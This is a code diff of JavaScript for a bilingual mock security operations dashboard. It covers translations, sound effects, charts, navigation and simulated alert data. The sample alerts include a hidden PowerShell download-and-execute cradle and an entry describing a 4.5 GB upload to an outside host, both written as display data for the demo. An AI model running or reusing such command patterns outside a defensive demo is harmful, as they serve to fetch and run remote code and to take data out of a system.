+                           "- <span class='text-blue-400'>matrix</span>: Toggles matrix code digital rain background.<br>" +
+                           "- <span class='text-blue-400'>clear</span>: Clears console terminal screen history.",
+                
+                // Redesign additions
+                lblRecentAlerts: "Recent Alerts",
+                lblTopThreats: "Top Detected Threats",
+                lblActiveIncidents: "Active Incidents",
+                lblDataIntegrations: "Integrations & Data Sources",
+                lblSecurityNews: "Security News",
+                lblTotalAlertsCard: "Total Alerts",
+                lblCriticalAlertsCard: "Critical Alerts",
+                lblHighAlertsCard: "High Alerts",
+                lblActiveIncidentsCard: "Active Incidents",
+                lblMonitoredAssetsCard: "Monitored Assets",
+                lblMonitoredUsersCard: "Monitored Users",
+                lblCollapseMenu: "Collapse Menu",
+                lblUnderDevelopment: "Module under development",
+                lblDevelopmentText: "This section is currently under active development for the enterprise release of AutoNovations VSOC.",
+                lblBackToOverview: "Back to Overview",
+                lblShift: "Shift: NOC - Evening",
+                lblActiveAnalyst: "Analyst Online",
+                lblClickForensics: "Click row for forensics",
+                lblClickRemediate: "Remediate on click",
+                lblIntegrationsTitle: "Integrations & Data Sources",
+                lblNewsTitle: "Security News",
+                lblNewsRead: "Read more",
+                lblDoughnutTitle: "Alerts by Severity",
+                lblTrendTitle: "Alerts Trend",
+                lblDiagTitle: "Servers Telemetry",
+                lblDiagPlaceholder: "Click on any node in the topology diagram on the left to view its telemetry and apply preventative or corrective actions in real time."
+            }
+        };
+
+        let currentLang = localStorage.getItem('preferredLang') || 'es';
+        
+        function changeLang(lang) {
+            currentLang = lang;
+            localStorage.setItem('preferredLang', lang);
+            
+            // Toggle language buttons style
+            if(lang === 'es') {
+                document.getElementById('lang-es').className = "px-2.5 py-1.5 text-[10px] font-bold bg-blue-600/20 text-blue-400";
+                document.getElementById('lang-en').className = "px-2.5 py-1.5 text-[10px] font-bold text-slate-500 hover:text-slate-200 transition-colors";
+            } else {
+                document.getElementById('lang-en').className = "px-2.5 py-1.5 text-[10px] font-bold bg-blue-600/20 text-blue-400";
+                document.getElementById('lang-es').className = "px-2.5 py-1.5 text-[10px] font-bold text-slate-500 hover:text-slate-200 transition-colors";
+            }
+            
+            // Translate elements
+            const t = vsocTranslations[lang];
+            document.title = t.title;
+            document.getElementById('btn-mock').innerText = t.btnMock;
+            
+            // Cards
+            document.getElementById('lbl-card-total').innerText = t.lblTotalAlertsCard;
+            document.getElementById('lbl-card-critical').innerText = t.lblCriticalAlertsCard;
+            document.getElementById('lbl-card-high').innerText = t.lblHighAlertsCard;
+            document.getElementById('lbl-card-active').innerText = t.lblActiveIncidentsCard;
+            document.getElementById('lbl-card-assets').innerText = t.lblMonitoredAssetsCard;
+            document.getElementById('lbl-card-users').innerText = t.lblMonitoredUsersCard;
+            
+            // Map
+            document.getElementById('lbl-map-title').innerText = t.lblMapTitle;
+            document.getElementById('lbl-live-radar').innerText = t.lblLiveRadar;
+            
+            // News & Integrations
+            document.getElementById('lbl-news-title').innerText = t.lblNewsTitle;
+            document.getElementById('lbl-news-read-1').innerText = t.lblNewsRead;
+            document.getElementById('lbl-news-read-2').innerText = t.lblNewsRead;
+            document.getElementById('lbl-integrations-title').innerText = t.lblIntegrationsTitle;
+            document.getElementById('status-siem-lbl').innerText = lang === 'es' ? 'Conectado' : 'Connected';
+            document.getElementById('status-edr-lbl').innerText = lang === 'es' ? 'Conectado' : 'Connected';
+            document.getElementById('status-fw-lbl').innerText = lang === 'es' ? 'Conectado' : 'Connected';
+            document.getElementById('status-ids-lbl').innerText = lang === 'es' ? 'Conectado' : 'Connected';
+            document.getElementById('status-intel-lbl').innerText = lang === 'es' ? 'Conectado' : 'Connected';
+            document.getElementById('status-cloud-lbl').innerText = lang === 'es' ? 'Conectado' : 'Connected';
+            
+            // Headers/Footers
+            document.getElementById('lbl-shift').innerText = t.lblShift;
+            document.getElementById('lbl-analyst-status').innerText = t.lblStatus;
+            document.getElementById('lbl-status-mesh').innerText = t.lblStatusMesh;
+            
+            // Sidebar buttons
+            document.getElementById('btn-tab-general').querySelector('span').innerText = lang === 'es' ? 'VISTA GENERAL' : 'OVERVIEW';
+            document.getElementById('btn-tab-alertas').querySelector('span').innerText = lang === 'es' ? 'ALERTAS' : 'ALERTS';
+            document.getElementById('btn-tab-incidentes').querySelector('span').innerText = lang === 'es' ? 'INCIDENTES' : 'INCIDENTS';
+            document.getElementById('btn-tab-casos').querySelector('span').innerText = lang === 'es' ? 'CASOS' : 'CASES';
+            document.getElementById('btn-tab-amenazas').querySelector('span').innerText = lang === 'es' ? 'INTELIGENCIA AMENAZAS' : 'THREAT INTEL';
+            document.getElementById('btn-tab-monitoreo').querySelector('span').innerText = lang === 'es' ? 'MONITOREO DE NODOS' : 'NODE MONITORING';
+            document.getElementById('btn-tab-activos').querySelector('span').innerText = lang === 'es' ? 'ACTIVOS' : 'ASSETS';
+            document.getElementById('btn-tab-usuarios').querySelector('span').innerText = lang === 'es' ? 'USUARIOS' : 'USERS';
+            document.getElementById('btn-tab-vulnerabilidades').querySelector('span').innerText = lang === 'es' ? 'VULNERABILIDADES' : 'VULNERABILITIES';
+            document.getElementById('btn-tab-reportes').querySelector('span').innerText = lang === 'es' ? 'REPORTES' : 'REPORTS';
+            document.getElementById('btn-tab-dashboards').querySelector('span').innerText = lang === 'es' ? 'DASHBOARDS' : 'DASHBOARDS';
+            document.getElementById('btn-tab-configuracion').querySelector('span').innerText = lang === 'es' ? 'CONSOLA (CONFIG)' : 'CONSOLE (CONFIG)';
+            document.getElementById('lbl-collapse-menu').innerText = t.lblCollapseMenu;
+
+            // View 1 (Dashboard panels text)
+            document.getElementById('lbl-recent-alerts-title').innerText = t.lblRecentAlerts;
+            document.getElementById('lbl-click-forensics').innerText = t.lblClickForensics;
+            document.getElementById('lbl-view-all-alerts').innerHTML = (lang === 'es' ? 'Ver todas las alertas' : 'View all alerts') + ` <i data-lucide="arrow-right" class="w-4 h-4 transition-transform group-hover:translate-x-1"></i>`;
+            document.getElementById('lbl-top-threats-title').innerText = t.lblTopThreats;
+            document.getElementById('lbl-view-all-reports').innerHTML = (lang === 'es' ? 'Ver reporte completo' : 'View full report') + ` <i data-lucide="arrow-right" class="w-4 h-4 transition-transform group-hover:translate-x-1"></i>`;
+            document.getElementById('lbl-active-incidents-title').innerText = t.lblActiveIncidents;
+            document.getElementById('lbl-click-remediate').innerText = t.lblClickRemediate;
+            document.getElementById('lbl-view-all-incidents').innerHTML = (lang === 'es' ? 'Ver todos los incidentes' : 'View all incidents') + ` <i data-lucide="arrow-right" class="w-4 h-4 transition-transform group-hover:translate-x-1"></i>`;
+            document.getElementById('lbl-doughnut-title').innerText = t.lblDoughnutTitle;
+            document.getElementById('lbl-total-doughnut-label').innerText = lang === 'es' ? 'Total' : 'Total';
+            document.getElementById('lbl-trend-title').innerText = t.lblTrendTitle;
+
+            // Table headers
+            document.getElementById('tbl-h-time').innerText = lang === 'es' ? 'TIEMPO' : 'TIME';
+            document.getElementById('tbl-h-severity').innerText = lang === 'es' ? 'SEVERIDAD' : 'SEVERITY';
+            document.getElementById('tbl-h-rule').innerText = lang === 'es' ? 'REGLA / DESCRIPCIÓN' : 'RULE / DESCRIPTION';
+            document.getElementById('tbl-h-source').innerText = lang === 'es' ? 'FUENTE' : 'SOURCE';
+            document.getElementById('tbl-h-dest').innerText = lang === 'es' ? 'DESTINO' : 'DESTINATION';
+
+            // Legends
+            document.getElementById('leg-det-crit').innerText = lang === 'es' ? 'Críticas' : 'Critical';
+            document.getElementById('leg-det-high').innerText = lang === 'es' ? 'Altas' : 'High';
+            document.getElementById('leg-det-med').innerText = lang === 'es' ? 'Medias' : 'Medium';
+            document.getElementById('leg-det-low').innerText = lang === 'es' ? 'Bajas' : 'Low';
+            document.getElementById('leg-det-info').innerText = lang === 'es' ? 'Informativas' : 'Informative';
+            
+            document.getElementById('trend-leg-crit').innerText = lang === 'es' ? 'Críticas' : 'Critical';
+            document.getElementById('trend-leg-high').innerText = lang === 'es' ? 'Altas' : 'High';
+            document.getElementById('trend-leg-med').innerText = lang === 'es' ? 'Medias' : 'Medium';
+            document.getElementById('trend-leg-low').innerText = lang === 'es' ? 'Bajas' : 'Low';
+            document.getElementById('trend-leg-info').innerText = lang === 'es' ? 'Informativas' : 'Informative';
+
+            document.getElementById('lbl-map-legend').innerText = lang === 'es' ? 'NIVEL DE AMENAZA' : 'THREAT LEVEL';
+            document.getElementById('lbl-leg-crit').innerText = lang === 'es' ? 'Crítico' : 'Critical';
+            document.getElementById('lbl-leg-high').innerText = lang === 'es' ? 'Alto' : 'High';
+            document.getElementById('lbl-leg-med').innerText = lang === 'es' ? 'Medio' : 'Medium';
+            document.getElementById('lbl-leg-low').innerText = lang === 'es' ? 'Bajo' : 'Low';
+            document.getElementById('lbl-leg-info').innerText = lang === 'es' ? 'Informativo' : 'Informative';
+
+            // View 2 (Monitoring Node text)
+            document.getElementById('lbl-topology-title').innerText = t.lblTopologyTitle;
+            document.getElementById('lbl-click-node').innerText = t.lblClickNode;
+            document.getElementById('lbl-node-total').innerText = t.lblNodeTotal;
+            document.getElementById('lbl-node-secure').innerText = t.lblNodeSecure;
+            document.getElementById('lbl-node-shield').innerText = t.lblNodeShield;
+            document.getElementById('lbl-node-threat').innerText = t.lblNodeThreat;
+            document.getElementById('lbl-node-load').innerText = t.lblNodeLoad;
+            document.getElementById('lbl-diag-title').innerText = t.lblDiagTitle;
+            document.getElementById('lbl-diag-placeholder').innerText = t.lblDiagPlaceholder;
+            document.getElementById('lbl-diag-status').innerText = t.lblDiagStatus;
+            document.getElementById('lbl-diag-ping').innerText = t.lblDiagPing;
+            document.getElementById('lbl-diag-cpu').innerText = t.lblDiagCpu;
+            document.getElementById('lbl-diag-os').innerText = t.lblDiagOs;
+            document.getElementById('btn-diag-shield').innerText = t.btnDiagShield;
+            document.getElementById('btn-diag-reboot').innerText = t.btnDiagReboot;
+            document.getElementById('lbl-system-integrity').innerText = t.lblIntegrity;
+            document.getElementById('lbl-defcon-state').innerText = t.lblDefcon;
+
+            // View 3 (Placeholder elements)
+            document.getElementById('lbl-placeholder-title').innerText = t.lblUnderDevelopment;
+            document.getElementById('lbl-placeholder-desc').innerText = t.lblDevelopmentText;
+            document.getElementById('btn-placeholder-back').innerText = t.lblBackToOverview;
+
+            // Translate dropdown select options
+            document.getElementById('dropdown-doughnut-time').options[0].text = lang === 'es' ? 'Últimas 24 horas' : 'Last 24 hours';
+            document.getElementById('dropdown-trend-time').options[0].text = lang === 'es' ? 'Últimos 7 días' : 'Last 7 days';
+            document.getElementById('dropdown-threats-time').options[0].text = lang === 'es' ? 'Últimas 24 horas' : 'Last 24 hours';
+
+            // Active diagnostics panel node details update if selected
+            if(selectedNodeId) {
+                renderNodeDetails(selectedNodeId);
+            }
+            
+            // Re-render recent alerts list & active incident cards to reflect language
+            renderRecentAlertsTable();
+            renderActiveIncidentCards();
+            
+            lucide.createIcons();
+        }
+
+        // --- AUDIO SYNTHESIS ENGINE ---
+        let audioCtx = null;
+        let soundEnabled = true;
+
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioCtx.state === 'suspended') {
+                audioCtx.resume();
+            }
+        }
+
+        function playTone(freq, type, duration, volume = 0.08) {
+            if (!soundEnabled) return;
+            initAudio();
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                
+                osc.type = type; // 'sine', 'square', 'sawtooth', 'triangle'
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                
+                gain.gain.setValueAtTime(volume, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
+                
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        const playSound = {
+            click: () => playTone(600, 'sine', 0.08, 0.04),
+            keystroke: () => playTone(350 + Math.random() * 700, 'triangle', 0.04, 0.015),
+            laser: () => {
+                if (!soundEnabled) return;
+                initAudio();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(900, audioCtx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(80, audioCtx.currentTime + 0.22);
+                gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.22);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.22);
+            },
+            alarm: () => {
+                if (!soundEnabled) return;
+                initAudio();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.type = 'sawtooth';
+                const now = audioCtx.currentTime;
+                osc.frequency.setValueAtTime(800, now);
+                osc.frequency.setValueAtTime(500, now + 0.15);
+                gain.gain.setValueAtTime(0.06, now);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.35);
+                osc.start();
+                osc.stop(now + 0.35);
+            },
+            success: () => {
+                if (!soundEnabled) return;
+                initAudio();
+                const now = audioCtx.currentTime;
+                playTone(440, 'sine', 0.08, 0.04);
+                setTimeout(() => playTone(554.37, 'sine', 0.08, 0.04), 70);
+                setTimeout(() => playTone(659.25, 'sine', 0.18, 0.04), 140);
+            },
+            error: () => {
+                if (!soundEnabled) return;
+                initAudio();
+                playTone(170, 'sawtooth', 0.3, 0.08);
+            }
+        };
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            const btn = document.getElementById('soundBtn');
+            if(soundEnabled) {
+                btn.innerHTML = '<i data-lucide="volume-2" class="w-4 h-4"></i>';
+                btn.className = "p-1.5 rounded-lg bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-blue-400 transition-colors";
+                initAudio();
+                playSound.click();
+            } else {
+                btn.innerHTML = '<i data-lucide="volume-x" class="w-4 h-4"></i>';
+                btn.className = "p-1.5 rounded-lg bg-red-950/20 border border-red-900/30 text-red-400 hover:text-red-300 transition-colors";
+            }
+            lucide.createIcons();
+        }
+
+        // --- STATE & DATA ---
+        const state = {
+            alerts: {
+                total: 1248,
+                critical: 156,
+                high: 392,
+                medium: 512,
+                low: 128,
+                informative: 60
+            },
+            integrity: 100.0,
+            defcon: 4,
+            threatsBlocked: 2780,
+            servers: {
+                api: { name: 'API Gateway', status: 'secure', ip: '10.0.0.10', load: 12, ping: 12, system: 'ROS2-Edge Engine v3', shielded: false },
+                auth: { name: 'Auth Server', status: 'secure', ip: '10.0.0.12', load: 6, ping: 18, system: 'Quantum Shield Security v2', shielded: false },
+                app: { name: 'App Node', status: 'secure', ip: '10.0.0.15', load: 22, ping: 10, system: 'LTS Ubuntu Core v22.04', shielded: false },
+                db: { name: 'Database Stack', status: 'secure', ip: '10.0.0.21', load: 14, ping: 25, system: 'Postgres Distributed Cluster', shielded: false },
+                backup: { name: 'Backup Vault', status: 'secure', ip: '10.0.0.99', load: 4, ping: 32, system: 'Hardened FreeBSD SecureVault', shielded: false }
+            },
+            blockedIps: new Set(['198.51.100.42', '203.0.113.88']),
+            recentAlerts: [
+                { time: '14:31:52', severity: 'CRITICAL', rule: 'Intento de fuerza bruta - RDP', source: '192.168.1.45', destination: '10.0.0.12', payload: 'AUTH_FAIL count=45 user=administrator service=rdp' },
+                { time: '14:31:41', severity: 'HIGH', rule: 'Comunicación con C2 detectado', source: '203.0.113.10', destination: '10.0.1.8', payload: 'DNS_QUERY: malwaredomain.com type=TXT trigger=heuristic' },
+                { time: '14:31:22', severity: 'HIGH', rule: 'Exfiltración de datos sospechosa', source: '10.0.2.15', destination: '198.51.100.23', payload: 'DATA_FLOW: 4.5 GB target=http://foreignstorage.net/upload' },
+                { time: '14:31:02', severity: 'MEDIUM', rule: 'Múltiples intentos de login fallidos', source: '10.0.0.25', destination: '-', payload: 'FAILED_LOGINS count=5 user=root service=ssh' },
+                { time: '14:30:55', severity: 'MEDIUM', rule: 'Uso anómalo de PowerShell', source: '10.0.3.7', destination: '-', payload: 'COMMAND: powershell -nop -w hidden -c "iex(new-object net.webclient).downloadstring()"' }
+            ],
+            activeIncidents: [
+                { id: 'INC-2024-00037', title: 'Posible ransomware en endpoint API Gateway', severity: 'CRITICAL', status: 'investigating', time: '14:25', nodeId: 'api' },
+                { id: 'INC-2024-00036', title: 'Actividad sospechosa de PowerShell en App Node', severity: 'HIGH', status: 'analyzing', time: '14:10', nodeId: 'app' },
+                { id: 'INC-2024-00035', title: 'Conexión saliente a IP maliciosa desde DB Stack', severity: 'HIGH', status: 'containing', time: '13:58', nodeId: 'db' },
+                { id: 'INC-2024-00034', title: 'Alerta de exfiltración de datos en Backup Vault', severity: 'MEDIUM', status: 'investigating', time: '13:42', nodeId: 'backup' },
+                { id: 'INC-2024-00033', title: 'Múltiples logins fallidos de usuario en Auth Server', severity: 'MEDIUM', status: 'new', time: '13:30', nodeId: 'auth' }
+            ]
+        };
+
+        // --- TAB NAVIGATION SYSTEM ---
+        let activeTab = 'general';
+        let sidebarCollapsed = false;
+
+        function switchTab(tabId) {
+            playSound.click();
+            
+            // Remove active classes from all tab buttons
+            const nav = document.getElementById('sidebar-nav');
+            const buttons = nav.querySelectorAll('button');
+            buttons.forEach(btn => {
+                btn.className = "w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40";
+            });
+
+            // Set active class to current button
+            const activeBtn = document.getElementById(`btn-tab-${tabId}`);
+            if(activeBtn) {
+                activeBtn.className = "w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all bg-[#15254d] text-blue-400 border-l-4 border-blue-500";
+            }
+
+            // Hide all container divs
+            document.getElementById('view-general-container').classList.add('hidden');
+            document.getElementById('view-monitoreo-container').classList.add('hidden');
+            document.getElementById('view-configuracion-container').classList.add('hidden');
+            document.getElementById('view-placeholder-container').classList.add('hidden');
+
+            const titleEl = document.getElementById('view-title');
+            const subtitleEl = document.getElementById('view-subtitle');
+            const t = vsocTranslations[currentLang];
+
+            // Show current view container
+            if (tabId === 'general') {
+                document.getElementById('view-general-container').classList.remove('hidden');
+                titleEl.innerText = currentLang === 'es' ? "Vista General" : "Overview";
+                subtitleEl.innerText = currentLang === 'es' ? "Resumen de la postura de seguridad y operaciones en tiempo real." : "Real-time summary of security posture and operations.";
+                activeTab = 'general';
+                // Trigger chart update / redraw
+                if(doughnutChart) {
+                    doughnutChart.resize();
+                    lineChart.resize();
+                }
+            } else if (tabId === 'monitoreo') {
+                document.getElementById('view-monitoreo-container').classList.remove('hidden');
+                titleEl.innerText = currentLang === 'es' ? "Monitoreo de Nodos" : "Node Monitoring";
+                subtitleEl.innerText = currentLang === 'es' ? "Telemetría y topología física de servidores." : "Telemetry and physical topology of system servers.";
+                activeTab = 'monitoreo';
+            } else if (tabId === 'configuracion') {
+                document.getElementById('view-configuracion-container').classList.remove('hidden');
+                titleEl.innerText = currentLang === 'es' ? "Consola de Comandos" : "Console CLI";
+                subtitleEl.innerText = currentLang === 'es' ? "Terminal interactiva de defensa core v4.8." : "Interactive core defense terminal v4.8.";
+                activeTab = 'configuracion';
+                setTimeout(() => document.getElementById('console-input').focus(), 50);
+            } else {
+                document.getElementById('view-placeholder-container').classList.remove('hidden');
+                titleEl.innerText = t.lblUnderDevelopment;
+                subtitleEl.innerText = t.lblDevelopmentText;
+                activeTab = 'placeholder';
+            }
+
+            lucide.createIcons();
+        }
+
+        function toggleSidebar() {
+            playSound.click();
+            const sidebar = document.getElementById('sidebar');
+            const collapseIcon = document.getElementById('collapse-icon');
+            const textElements = document.querySelectorAll('.sidebar-text-element');
+
+            if(sidebarCollapsed) {
+                // Expand
+                sidebar.className = "w-64 shrink-0 bg-[#05070c] border-r border-slate-900/60 flex flex-col justify-between py-6 px-4 z-20 transition-all duration-300 relative";
+                collapseIcon.className = "w-4.5 h-4.5 transition-transform duration-300";
+                setTimeout(() => {
+                    textElements.forEach(el => el.classList.remove('hidden'));
+                }, 100);
+                sidebarCollapsed = false;
+            } else {
+                // Collapse
+                sidebar.className = "w-16 shrink-0 bg-[#05070c] border-r border-slate-900/60 flex flex-col justify-between py-6 px-3 z-20 transition-all duration-300 relative items-center text-center";
+                collapseIcon.className = "w-4.5 h-4.5 transition-transform duration-300 rotate-180";
+                textElements.forEach(el => el.classList.add('hidden'));
+                sidebarCollapsed = true;
+            }
+        }
+
+        // --- SPARKLINE DRAWER ---
+        const kpiSparkData = {
+            total: [45, 52, 49, 60, 48, 55, 42],
+            critical: [12, 18, 14, 25, 20, 22, 15],
+            high: [32, 28, 35, 30, 45, 38, 31],
+            incidents: [6, 9, 8, 12, 10, 11, 7],
+            assets: [84, 85, 84, 86, 85, 86, 85],
+            users: [72, 74, 73, 75, 74, 76, 75]
+        };
+
+        function drawSparkline(canvasId, points, color) {
+            const canvas = document.getElementById(canvasId);
+            if (!canvas) return;
+            const ctx = canvas.getContext('2d');
+            const width = canvas.width = 65;
+            const height = canvas.height = 18;
+            ctx.clearRect(0, 0, width, height);
+            ctx.strokeStyle = color;
+            ctx.lineWidth = 1.8;
+            ctx.lineCap = 'round';
+            ctx.lineJoin = 'round';
+            ctx.beginPath();
+            
+            const max = Math.max(...points) || 1;
+            const min = Math.min(...points) || 0;
+            const range = max - min || 1;
+
+            for (let i = 0; i < points.length; i++) {
+                const x = (i / (points.length - 1)) * width;
+                const y = height - ((points[i] - min) / range) * (height - 4) - 2;
+                if (i === 0) ctx.moveTo(x, y);
+                else ctx.lineTo(x, y);
+            }
+            ctx.stroke();
+
+            // Gradient fill
+            const grad = ctx.createLinearGradient(0, 0, 0, height);
+            grad.addColorStop(0, color + '20');
+            grad.addColorStop(1, color + '00');
+            ctx.fillStyle = grad;
+            ctx.lineTo(width, height);
+            ctx.lineTo(0, height);
+            ctx.closePath();
+            ctx.fill();
+        }
+
+        function drawAllSparklines() {
+            drawSparkline('sparkline-total', kpiSparkData.total, '#ff003c');
+            drawSparkline('sparkline-critical', kpiSparkData.critical, '#ef4444');
+            drawSparkline('sparkline-high', kpiSparkData.high, '#f97316');
+            drawSparkline('sparkline-incidents', kpiSparkData.incidents, '#c084fc');
+            drawSparkline('sparkline-assets', kpiSparkData.assets, '#3b82f6');
+            drawSparkline('sparkline-users', kpiSparkData.users, '#10b981');
+        }
+
+        // --- CHART.JS CONFIGURATION ---
+        let doughnutChart = null;
+        let lineChart = null;
+
+        function initCharts() {
+            // Doughnut Chart
+            const ctxDoughnut = document.getElementById('doughnutChart').getContext('2d');
+            doughnutChart = new Chart(ctxDoughnut, {
+                type: 'doughnut',
+                data: {
+                    labels: ['Críticas', 'Altas', 'Medias', 'Bajas', 'Informativas'],
+                    datasets: [{
+                        data: [
+                            state.alerts.critical, 
+                            state.alerts.high, 
+                            state.alerts.medium, 
+                            state.alerts.low, 
+                            state.alerts.informative
+                        ],
+                        backgroundColor: [
+                            '#ff003c', // Critical
+                            '#f97316', // High
+                            '#eab308', // Medium
+                            '#3b82f6', // Low
+                            '#8b5cf6'  // Informative
+                        ],
+                        borderWidth: 0,
+                        hoverOffset: 6
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    cutout: '72%',
+                    plugins: {
+                        legend: {
+                            display: false
+                        },
+                        tooltip: {
+                            backgroundColor: '#0d1222',
+                            titleColor: '#fff',
+                            bodyColor: '#cbd5e1',
+                            borderColor: 'rgba(255, 255, 255, 0.08)',
+                            borderWidth: 1,
+                            padding: 8,
+                            bodyFont: {
+                                family: 'monospace',
+                                size: 10
+                            },
+                            callbacks: {
+                                label: function(context) {
+                                    const val = context.raw;
+                                    const total = state.alerts.total;
+                                    return ` ${context.label}: ${val} (${((val / total) * 100).toFixed(0)}%)`;
+                                }
+                            }
+                        }
+                    }
+                }
+            });
+
+            // Trend Chart
+            const ctxLine = document.getElementById('lineChart').getContext('2d');
+            lineChart = new Chart(ctxLine, {
+                type: 'line',
+                data: {
+                    labels: ['14/05', '15/05', '16/05', '17/05', '18/05', '19/05', '20/05'],
+                    datasets: [
+                        {
+                            label: 'Críticas',
+                            data: [120, 110, 130, 105, 140, 150, state.alerts.critical],
+                            borderColor: '#ff003c',
+                            borderWidth: 1.8,
+                            tension: 0.4,
+                            pointRadius: 0,
+                            pointHoverRadius: 4,
+                            fill: false
+                        },
+                        {
+                            label: 'Altas',
+                            data: [350, 320, 380, 310, 360, 375, state.alerts.high],
+                            borderColor: '#f97316',
+                            borderWidth: 1.8,
+                            tension: 0.4,
+                            pointRadius: 0,
+                            pointHoverRadius: 4,
+                            fill: false
+                        },
+                        {
+                            label: 'Medias',
+                            data: [480, 490, 470, 500, 485, 495, state.alerts.medium],
+                            borderColor: '#eab308',
+                            borderWidth: 1.8,
+                            tension: 0.4,
+                            pointRadius: 0,
+                            pointHoverRadius: 4,
+                            fill: false
+                        },
+                        {
+                            label: 'Bajas',
+                            data: [110, 120, 115, 130, 125, 122, state.alerts.low],
+                            borderColor: '#3b82f6',
+                            borderWidth: 1.8,
+                            tension: 0.4,
+                            pointRadius: 0,
+                            pointHoverRadius: 4,
+                            fill: false
+                        },
+                        {
+                            label: 'Informativas',
+                            data: [50, 55, 48, 62, 58, 52, state.alerts.informative],
+                            borderColor: '#8b5cf6',
+                            borderWidth: 1.8,
+                            tension: 0.4,
+                            pointRadius: 0,
+                            pointHoverRadius: 4,
+                            fill: false
+                        }
+                    ]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        x: {
+                            grid: {
+                                color: 'rgba(255, 255, 255, 0.02)'
+                            },
+                            ticks: {
+                                color: '#64748b',
+                                font: {
+                                    size: 9,
+                                    family: 'monospace'
+                                }
+                            }
+                        },
+                        y: {
+                            grid: {
+                                color: 'rgba(255, 255, 255, 0.02)'
+                            },
+                            ticks: {
+                                color: '#64748b',
+                                font: {
+                                    size: 9,
+                                    family: 'monospace'
+                                }
+                            }
+                        }
+                    },
+                    plugins: {
+                        legend: {
+                            display: false
+                        },
+                        tooltip: {
+                            backgroundColor: '#0d1222',
+                            titleColor: '#fff',
+                            bodyColor: '#cbd5e1',
+                            borderColor: 'rgba(255, 255, 255, 0.08)',
+                            borderWidth: 1,
+                            padding: 8,
+                            bodyFont: {
+                                family: 'monospace',
+                                size: 10
+                            }
+                        }
+                    }
+                }
+            });
+        }
+
+        function updateCharts() {
+            if(!doughnutChart || !lineChart) return;
+            
+            // Update doughnut data
+            doughnutChart.data.datasets[0].data = [
+                state.alerts.critical, 
+                state.alerts.high, 
+                state.alerts.medium, 
+                state.alerts.low, 
+                state.alerts.informative
+            ];
+            doughnutChart.update();
+
+            // Update line data (last point of trend)
+            lineChart.data.datasets[0].data[6] = state.alerts.critical;
+            lineChart.data.datasets[1].data[6] = state.alerts.high;
+            lineChart.data.datasets[2].data[6] = state.alerts.medium;
+            lineChart.data.datasets[3].data[6] = state.alerts.low;
+            lineChart.data.datasets[4].data[6] = state.alerts.informative;
+            lineChart.update();
+
+            // Update legends & totals
+            document.getElementById('kpi-total-val').innerText = state.alerts.total.toLocaleString();
+            document.getElementById('kpi-critical-val').innerText = state.alerts.critical.toLocaleString();
+            document.getElementById('kpi-high-val').innerText = state.alerts.high.toLocaleString();
+            document.getElementById('doughnut-total-center').innerText = state.alerts.total.toLocaleString();
+
+            const cTotal = state.alerts.total;
+            document.getElementById('doughnut-val-crit').innerText = `${state.alerts.critical} (${((state.alerts.critical / cTotal) * 100).toFixed(0)}%)`;
+            document.getElementById('doughnut-val-high').innerText = `${state.alerts.high} (${((state.alerts.high / cTotal) * 100).toFixed(0)}%)`;
+            document.getElementById('doughnut-val-med').innerText = `${state.alerts.medium} (${((state.alerts.medium / cTotal) * 100).toFixed(0)}%)`;
+            document.getElementById('doughnut-val-low').innerText = `${state.alerts.low} (${((state.alerts.low / cTotal) * 100).toFixed(0)}%)`;
+            document.getElementById('doughnut-val-info').innerText = `${state.alerts.informative} (${((state.alerts.informative / cTotal) * 100).toFixed(0)}%)`;
+        }
+
+        // --- TOPOLOGY INTERACTIVE DIAGNOSTICS ---
+        let selectedNodeId = null;
+
+        function selectNode(nodeId) {
+            playSound.click();
+
+            if (nodeId === 'firewall') {
+                selectedNodeId = null;
+                document.getElementById('diag-panel').classList.add('hidden');
+                document.getElementById('diag-empty-placeholder').classList.remove('hidden');
+
+                // Alert details firewall popup
+                const t = vsocTranslations[currentLang];
+                Swal.fire({
+                    title: `<div class="font-tech text-blue-400 text-sm tracking-wider uppercase mb-1">${t.diagFirewallTitle}</div>`,
+                    html: `<p class="text-xs leading-relaxed text-slate-400 mt-2">${t.diagFirewallDesc}</p>
+                           <div class="mt-4 border border-slate-900 rounded-lg p-3 text-left font-mono text-xs text-slate-400 space-y-1.5 bg-slate-950/60">
+                             <div><b>Total Blocked IPs:</b> ${state.blockedIps.size}</div>
+                             <div><b>Active Rules:</b> DPI, GeoIP Block, SSH-RateLimit</div>
+                             <div><b>Status:</b> <span class="text-emerald-400 font-bold">FILTERING ACTIVE</span></div>
+                           </div>`,
+                    confirmButtonText: t.forensicCancel,
+                    buttonsStyling: false,
+                    customClass: {
+                        popup: 'vsoc-swal-popup',
+                        confirmButton: 'px-5 py-2 border border-slate-800 text-slate-400 hover:text-white rounded-lg font-tech text-xs tracking-wider transition-all cursor-pointer bg-slate-900/40'
+                    }
+                });
+                return;
+            }
+
+            selectedNodeId = nodeId;
+            document.getElementById('diag-empty-placeholder').classList.add('hidden');
+            document.getElementById('diag-panel').classList.remove('hidden');
+            
+            renderNodeDetails(nodeId);
